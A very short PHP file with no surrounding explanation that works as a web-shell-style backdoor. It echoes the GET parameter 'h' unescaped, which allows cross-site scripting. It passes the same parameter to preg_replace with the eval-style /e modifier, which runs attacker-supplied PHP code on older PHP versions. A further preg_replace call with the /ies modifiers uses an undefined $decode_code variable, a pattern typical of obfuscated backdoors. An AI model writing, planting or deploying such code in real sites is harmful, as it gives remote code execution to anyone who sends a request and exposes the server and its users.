<?php
echo $_GET['h'];
echo preg_replace("/test/e", $_GET["h"], "jutst test"); 
preg_replace("/(.*)/ies", $decode_code, null);
?>